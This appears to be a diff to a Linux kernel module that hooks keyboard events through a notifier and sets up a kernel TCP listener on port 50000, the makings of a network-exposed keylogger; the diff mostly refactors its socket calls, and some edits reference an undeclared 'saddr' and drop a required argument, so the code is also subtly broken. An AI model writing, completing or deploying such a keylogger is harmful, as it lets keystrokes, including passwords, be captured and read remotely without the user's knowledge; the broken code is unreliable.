@@ -3,6 +3,9 @@
 #include <linux/keyboard.h>
 #include <linux/printk.h>
 #include <linux/net.h>
+#include <linux/inet.h>
+#include <linux/socket.h>
+#include <linux/tcp.h>
 
 #define PORT 50000
 
@@ -34,12 +37,12 @@ static struct notifier_block keyboard_nb = {
 };
 
 // Creates socket
-static int create_socket(struct socket **fsock) {
+static int create_socket() {
     struct sockaddr_in server_addr;
     int ret;
 
     // Create TCP socket
-    ret = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, fsock);
+    ret = sock_create_kern(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (ret < 0) {
         printk(KERN_ERR "failed to create socket\n");
         return ret;
@@ -53,29 +56,32 @@ static int create_socket(struct socket **fsock) {
 
 
     // Bind socket to server address
-    // ret = kernel_bind(sock, (struct sockaddr*)&saddr, sizeof(saddr));
-    ret = (*fsock)->ops->bind(*fsock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+    ret = kernel_bind(sock, (struct sockaddr*)&saddr, sizeof(saddr));
+    //ret = (*fsock)->ops->bind(*fsock, (struct sockaddr *)&server_addr, sizeof(server_addr));
     if (ret < 0) {
         printk(KERN_ERR "failed to bind socket\n");
-        (*fsock)->ops->release(*fsock);
+        //(*fsock)->ops->release(*fsock);
+        sock_release(sock);
         return ret;
     }
 
     // Listen for incoming connections
-    // ret = kernel_listen(sock, 1);
-    ret = (*fsock)->ops->listen(*fsock, 1);
+    ret = kernel_listen(sock, 1);
+    //ret = (*fsock)->ops->listen(*fsock, 1);
     if (ret < 0) {
         printk(KERN_ERR "failed to listen on socket\n");
-        (*fsock)->ops->release(*fsock);
+        //(*fsock)->ops->release(*fsock);
+        sock_release(sock);
         return ret;
     }
 
     // Accept incoming connections
-    // ret = kernel_accept(sock, &client_sock, 0);
-    ret = (*fsock)->ops->accept(*fsock, &client_sock, 0);
+    ret = kernel_accept(sock, &client_sock, 0);
+    //ret = (*fsock)->ops->accept(*fsock, &client_sock, 0);
     if (ret < 0) {
         printk(KERN_ERR "failed to accept connection\n");
-        (*fsock)->ops->release(*fsock);
+        //(*fsock)->ops->release(*fsock);
+        sock_release(sock);
         return ret;
     }
 
@@ -86,7 +92,7 @@ static int create_socket(struct socket **fsock) {
 static int __init keyboard_module_init(void)
 { 
     // Create server
-    create_socket(&sock);
+    create_socket();
 
     // Register the keyboard notifier
     register_keyboard_notifier(&keyboard_nb);
@@ -100,7 +106,8 @@ static void __exit keyboard_module_exit(void)
     unregister_keyboard_notifier(&keyboard_nb);
 
     // Release socket
-    sock->ops->release(sock);
+    //sock->ops->release(sock);
+    sock_release(sock);
 }
 
 module_init(keyboard_module_init);
